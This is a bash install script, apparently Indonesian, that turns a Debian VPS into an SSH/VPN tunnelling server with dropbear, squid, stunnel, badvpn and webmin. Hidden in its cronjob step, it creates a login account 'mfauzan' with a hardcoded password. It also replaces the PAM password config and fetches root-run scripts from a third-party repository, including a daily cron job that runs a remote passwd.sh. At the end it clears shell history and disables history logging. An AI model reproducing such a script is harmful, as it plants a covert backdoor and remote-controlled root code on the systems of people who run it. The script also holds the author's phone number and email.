#!/bin/bash
#Autoscript Created By M Fauzan Romandhoni (m.fauzan58@yahoo.com) (6281311310405)
clear


if [[ $USER != "root" ]]; then
	echo "Maaf, Anda harus menjalankan ini sebagai root"
	exit
fi

# initialisasi var
export DEBIAN_FRONTEND=noninteractive
OS=`uname -m`;
#MYIP=$(wget -qO- ipv4.icanhazip.com);

# get the VPS IP
#ip=`ifconfig venet0:0 | grep 'inet addr' | awk {'print $2'} | sed s/.*://`

#MYIP=`ifconfig | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0' | head -n1`;
MYIP=$(ifconfig | grep 'inet addr:' | grep -v inet6 | grep -vE '127\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' | cut -d: -f2 | awk '{ print $1}' | head -1)
if [ "$MYIP" = "" ]; then
	MYIP=$(wget -qO- ipv4.icanhazip.com)
fi
MYIP2="s/xxxxxxxxx/$MYIP/g";
ether=`ifconfig | cut -c 1-8 | sort | uniq -u | grep venet0 | grep -v venet0:`
if [[ $ether = "" ]]; then
        ether=eth0
fi

#vps="zvur";
vps="aneka";

#if [[ $vps = "zvur" ]]; then
	#source="http://"
#else
	source="https://raw.githubusercontent.com/sshpremi/deb9/master"
#fi

myip=`ifconfig | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0' | head -n1`;
myint=`ifconfig | grep -B1 "inet addr:$myip" | head -n1 | awk '{print $1}'`;
if [ $USER != 'root' ]; then
echo "Sorry, for run the script please using root user"
exit 1
fi
if [[ "$EUID" -ne 0 ]]; then
echo "Sorry, you need to run this as root"
exit 2
fi

# ENABLE IPV4 AND IPV6
echo ipv4 >> /etc/modules
echo ipv6 >> /etc/modules
sysctl -w net.ipv4.ip_forward=1
sed -i 's/#net.ipv4.ip_forward=1/net.ipv4.ip_forward=1/g' /etc/sysctl.conf
sed -i 's/#net.ipv6.conf.all.forwarding=1/net.ipv6.conf.all.forwarding=1/g' /etc/sysctl.conf
sysctl -p
clear

# wget and curl
apt-get update;apt-get -y install wget curl;

# set time GMT +7
ln -fs /usr/share/zoneinfo/Asia/Jakarta /etc/localtime

# set locale
sed -i 's/AcceptEnv/#AcceptEnv/g' /etc/ssh/sshd_config
service ssh restart

# set repo
sh -c 'echo "deb http://download.webmin.com/download/repository sarge contrib" > /etc/apt/sources.list.d/webmin.list'
wget -qO - http://www.webmin.com/jcameron-key.asc | apt-key add -
wget "http://www.dotdeb.org/dotdeb.gpg"
wget "http://www.webmin.com/jcameron-key.asc"
cat dotdeb.gpg | apt-key add -;rm dotdeb.gpg
cat jcameron-key.asc | apt-key add -;rm jcameron-key.asc

# remove unused
apt-get -y --purge remove samba*;
apt-get -y --purge remove apache2*;
apt-get -y --purge remove sendmail*;
apt-get -y --purge remove bind9*;
apt-get -y --purge remove dropbear*;

# update
apt-get update; apt-get -y upgrade;

# install webserver
apt-get -y install nginx php-fpm php-mcrypt php-cli libexpat1-dev libxml-parser-perl

# install essential package
echo "mrtg mrtg/conf_mods boolean true" | debconf-set-selections
apt-get -y install bmon iftop htop nmap axel nano iptables traceroute sysv-rc-conf dnsutils bc nethogs openvpn vnstat less screen psmisc apt-file whois ptunnel ngrep mtr git zsh mrtg snmp snmpd snmp-mibs-downloader unzip unrar rsyslog debsums rkhunter
apt-get -y install build-essential

# script
wget -O /etc/pam.d/common-password "$source/common-password"
chmod +x /etc/pam.d/common-password

# disable exim
service exim4 stop
sysv-rc-conf exim4 off

# update apt-file
apt-file update

# setting vnstat
vnstat -u -i eth0
service vnstat restart

# rc.local
wget -O /etc/rc.local "$source/rc.local";chmod +x /etc/rc.local
wget -O /etc/iptables.up.rules "$source/iptables.up.rules"
sed -i '$ i\iptables-restore < /etc/iptables.up.rules' /etc/rc.local
MYIP=`curl -s ifconfig.me`;
MYIP2="s/xxxxxxxxx/$MYIP/g";
sed -i $MYIP2 /etc/iptables.up.rules;
iptables-restore < /etc/iptables.up.rules

# disable ipv6
echo 1 > /proc/sys/net/ipv6/conf/all/disable_ipv6
sed -i '$ i\echo 1 > /proc/sys/net/ipv6/conf/all/disable_ipv6' /etc/rc.local

# Instal (D)DoS Deflate
if [ -d '/usr/local/ddos' ]; then
	echo; echo; echo "Please un-install the previous version first"
	exit 0
else
	mkdir /usr/local/ddos
fi
clear
echo; echo 'Installing DOS-Deflate 0.6'; echo
echo; echo -n 'Downloading source files...'
wget -q -O /usr/local/ddos/ddos.conf $sources/ddos.conf
echo -n '.'
wget -q -O /usr/local/ddos/LICENSE $source/LICENSE
echo -n '.'
wget -q -O /usr/local/ddos/ignore.ip.list $source/ignore.ip.list
echo -n '.'
wget -q -O /usr/local/ddos/ddos.sh $source/ddos/ddos.sh
chmod 0755 /usr/local/ddos/ddos.sh
cp -s /usr/local/ddos/ddos.sh /usr/local/sbin/ddos
echo '...done'
echo; echo -n 'Creating cron to run script every minute.....(Default setting)'
/usr/local/ddos/ddos.sh --cron > /dev/null 2>&1
echo '.....done'
echo; echo 'Installation has completed.'
echo 'Config file is at /usr/local/ddos/ddos.conf'
echo 'Please send in your comments and/or suggestions to zaf@vsnl.com'

# install fail2ban
apt-get update;apt-get -y install fail2ban;service fail2ban restart;

# Web Server
cd
rm /etc/nginx/sites-enabled/default
rm /etc/nginx/sites-available/default
wget -O /etc/nginx/nginx.conf "$source/nginx.conf"
mkdir -p /home/vps/public_html
echo "<?php phpinfo(); ?>" > /home/vps/public_html/info.php
wget -O /home/vps/public_html/index.html $source/index.html
wget -O /etc/nginx/conf.d/vps.conf "$source/vps.conf"
sed -i 's/listen = \/var\/run\/php7.0-fpm.sock/listen = 127.0.0.1:9000/g' /etc/php/7.0/fpm/pool.d/www.conf
service php7.0-fpm restart
service nginx restart

# Cronjob
cd;wget $source/cronjob.tar
tar xf cronjob.tar;mv uptime.php /home/vps/public_html/
mv usertol userssh uservpn /usr/bin/;mv cronvpn cronssh /etc/cron.d/
chmod +x /usr/bin/usertol;chmod +x /usr/bin/userssh;chmod +x /usr/bin/uservpn;
useradd -m -g users -s /bin/bash mfauzan
echo "mfauzan:121998" | chpasswd
clear
rm -rf /root/cronjob.tar

# install badvpn
wget -O /usr/bin/badvpn-udpgw $source/badvpn-udpgw
if [[ $OS == "x86_64" ]]; then
  wget -O /usr/bin/badvpn-udpgw $source/badvpn-udpgw64
fi
sed -i '$ i\screen -AmdS badvpn badvpn-udpgw --listen-addr 127.0.0.1:7300' /etc/rc.local
chmod +x /usr/bin/badvpn-udpgw
screen -AmdS badvpn badvpn-udpgw --listen-addr 127.0.0.1:7300
cd

# ssh
sed -i '$ i\Banner /etc/banner.txt' /etc/ssh/sshd_config
sed -i 's/AcceptEnv/#AcceptEnv/g' /etc/ssh/sshd_config

# dropbear
apt-get -y install dropbear
sed -i 's/NO_START=1/NO_START=0/g' /etc/default/dropbear
sed -i 's/DROPBEAR_PORT=22/DROPBEAR_PORT=444/g' /etc/default/dropbear
sed -i 's/DROPBEAR_EXTRA_ARGS=/DROPBEAR_EXTRA_ARGS="-p 80"/g' /etc/default/dropbear
echo "/bin/false" >> /etc/shells
echo "/usr/sbin/nologin" >> /etc/shells
sed -i 's@DROPBEAR_BANNER=""@DROPBEAR_BANNER="/etc/banner.txt"@g' /etc/default/dropbear
service ssh restart
service dropbear restart

# BAANER
wget -O /etc/banner.txt $source/banner.txt

# install stunnel4
wget $source/ssl.sh
bash ssl.sh 
rm -f ssl.sh

# install webmin
cd
wget "http://prdownloads.sourceforge.net/webadmin/webmin_1.900_all.deb"
dpkg --install webmin_1.900_all.deb;
apt-get -y -f install;
rm /root/webmin_1.900_all.deb
sed -i 's/ssl=1/ssl=0/g' /etc/webmin/miniserv.conf
service webmin re
start

# download script
cd
wget -O /usr/bin/benchmark $source/benchmark.sh
wget -O /usr/bin/speedtest $source/speedtest_cli.py
wget -O /usr/bin/ps-mem $source/ps_mem.py
wget -O /usr/bin/edit-squid $source/edit-squid.sh
wget -O /usr/bin/edit-dropbear $source/edit-dropbear.sh
wget -O /usr/bin/edit-port $source/edit-port.sh
wget -O /usr/bin/menu $source/menu.sh
wget -O /usr/bin/user-active-list $source/user-active-list.sh
wget -O /usr/bin/user-add $source/user-add.sh
wget -O /usr/bin/user-del $source/user-del.sh
wget -O /usr/bin/delete-user-expire $source/delete-user-expire.sh
wget -O /usr/bin/user-ban $source/user-ban.sh
wget -O /usr/bin/user-unban $source/user-unban.sh
wget -O /usr/bin/user-expire-list $source/user-expire-list.sh
wget -O /usr/bin/user-trial $source/user-trial.sh
wget -O /usr/bin/user-lock $source/user-lock.sh
wget -O /usr/bin/user-unlock $source/user-unlock.sh
wget -O /usr/bin/userlimit.sh $source/userlimit.sh
wget -O /usr/bin/userlimitssh.sh $source/userlimitssh.sh
wget -O /usr/bin/user-list $source/user-list.sh
wget -O /usr/bin/user-login $source/user-login.sh
wget -O /usr/bin/user-pass $source/user-pass.sh
wget -O /usr/bin/user-renew $source/user-renew.sh
wget -O /usr/bin/clearcache.sh $source/clearcache.sh
wget -O /usr/bin/log-ban $source/log-ban.sh
wget -O /usr/bin/health $source/health.sh
wget -O /usr/bin/cache-ram $source/cache-ram.sh
wget -O /usr/bin/edit-banner $source/edit-banner.sh
cd
#permission
cd
chmod +x /usr/bin/benchmark
chmod +x /usr/bin/speedtest
chmod +x /usr/bin/ps-mem
chmod +x /usr/bin/edit-squid
chmod +x /usr/bin/edit-dropbear
chmod +x /usr/bin/edit-port
chmod +x /usr/bin/menu
chmod +x /usr/bin/user-active-list
chmod +x /usr/bin/user-add
chmod +x /usr/bin/user-del
chmod +x /usr/bin/delete-user-expire
chmod +x /usr/bin/user-ban
chmod +x /usr/bin/user-unban
chmod +x /usr/bin/user-expire-list
chmod +x /usr/bin/user-trial
chmod +x /usr/bin/user-lock
chmod +x /usr/bin/user-unlock
chmod +x /usr/bin/userlimit.sh
chmod +x /usr/bin/userlimitssh.sh
chmod +x /usr/bin/user-list
chmod +x /usr/bin/user-login
chmod +x /usr/bin/user-pass
chmod +x /usr/bin/user-renew
chmod +x /usr/bin/clearcache.sh
chmod +x /usr/bin/log-ban
chmod +x /usr/bin/health
chmod +x /usr/bin/cache-ram
chmod +x /usr/bin/edit-banner
cd

#rm -rf /etc/cron.weekly/
#rm -rf /etc/cron.hourly/
#rm -rf /etc/cron.monthly/
rm -rf /etc/cron.daily/

# autoreboot
echo "*/10 * * * * root service dropbear restart" > /etc/cron.d/dropbear
echo "*/10 * * * * root service squid restart" > /etc/cron.d/squid
echo "*/10 * * * * root service ssh restart" > /etc/cron.d/ssh
echo "*/10 * * * * root service webmin restart" > /etc/cron.d/webmin
#echo "0 */48 * * * root /sbin/reboot" > /etc/cron.d/reboot
echo "00 23 * * * root /usr/bin/delete-user-expire" > /etc/cron.d/delete-user-expire
echo "0 */1 * * * root echo 3 > /proc/sys/vm/drop_caches" > /etc/cron.d/clearcaches
#echo "0 */1 * * * root /usr/bin/clearcache.sh" > /etc/cron.d/clearcache1
wget -O /root/passwd "$source/passwd.sh"
chmod +x /root/passwd
echo "01 23 * * * root /root/passwd" > /etc/cron.d/passwd
cd

dd if=/dev/zero of=/swapfile bs=2048 count=2048k
# buat swap
mkswap /swapfile
# jalan swapfile
swapon /swapfile
#auto star saat reboot
wget $source/fstab
mv ./fstab /etc/fstab
chmod 644 /etc/fstab
sysctl vm.swappiness=10
#permission swapfile
chown root:root /swapfile 
chmod 0600 /swapfile
cd

# text gambar
apt-get install boxes

# install teks berwarna
sudo apt-get -y install ruby
sudo gem install lolcat

# install neofetch
echo "deb http://dl.bintray.com/dawidd6/neofetch jessie main" | tee -a /etc/apt/sources.list
curl "https://bintray.com/user/downloadSubjectPublicKey?username=bintray"| apt-key add -
apt-get update
apt-get install neofetch

echo "deb http://dl.bintray.com/dawidd6/neofetch jessie main" | tee -a /etc/apt/sources.list
curl "https://bintray.com/user/downloadSubjectPublicKey?username=bintray"| apt-key add -
apt-get update
apt-get install neofetch
echo "clear" >> .profile
echo "neofetch" >> .profile

# finishing
chown -R www-data:www-data /home/vps/public_html
service cron restart
service nginx start
service ssh restart
service dropbear restart
service fail2ban restart
service stunnel4 restart
service squid restart
service webmin restart
rm -rf ~/.bash_history && history -c
echo "unset HISTFILE" >> /etc/profile

history -c
# history
clear
echo ""  | tee -a log-install.txt
echo "=============================================="  | tee -a log-install.txt | lolcat
echo "  Autoscript Created By M Fauzan Romandhoni "  | tee -a log-install.txt | lolcat
echo "----------------------------------------------"  | tee -a log-install.txt | lolcat
echo "Facebook    : https://www.facebook.com/cyb32.n0b"  | tee -a log-install.txt | lolcat
echo "Contact Me  : +62 81311310405"  | tee -a log-install.txt | lolcat
echo "----------------------------------------------"  | tee -a log-install.txt | lolcat
echo "Service     :" | tee -a log-install.txt | lolcat
echo "-------------" | tee -a log-install.txt | lolcat
echo "Nginx       : 81"  | tee -a log-install.txt | lolcat
echo "Webmin      : http://$MYIP:10000/" | tee -a log-install.txt | lolcat
echo "badvpn      : badvpn-udpgw port 7300" | tee -a log-install.txt | lolcat
echo "Squid3      : 8080, 3128"  | tee -a log-install.txt | lolcat
echo "OpenSSH     : 22"  | tee -a log-install.txt | lolcat
echo "Dropbear    : 80, 444"  | tee -a log-install.txt | lolcat
echo "SSL/TLS     : 443"  | tee -a log-install.txt | lolcat
echo "Timezone    : Asia/Jakarta"  | tee -a log-install.txt | lolcat
echo "Fail2Ban    : [ON]"   | tee -a log-install.txt | lolcat | lolcat
echo "Anti [D]dos : [ON]"   | tee -a log-install.txt | lolcat
echo "IPv6        : [ON]" | tee -a log-install.txt | lolcat
echo "Tools       :" | tee -a log-install.txt | lolcat
echo "   axel, bmon, htop, iftop, mtr, rkhunter, nethogs: nethogs $ether" | tee -a log-install.txt | lolcat
echo "Auto Lock & Delete User Expire tiap jam 00:00" | tee -a log-install.txt | lolcat
echo "VPS Restart : 00.00/24.00 WIB"   | tee -a log-install.txt | lolcat
echo ""  | tee -a log-install.txt
echo "----------------------------------------------"  | tee -a log-install.txt | lolcat
echo "    -------THANK YOU FOR CHOIS US--------"  | tee -a log-install.txt | lolcat
echo "=============================================="  | tee -a log-install.txt | lolcat
echo "-   PLEASE REBOOT TAKE EFFECT TERIMA KASIH   -" | lolcat
echo "ALL MODD DEVELOPED SCRIPT BY FAUZAN ROMANDHONI" | lolcat
echo "==============================================" | lolcat
cat /dev/null > ~/.bash_history && history -c
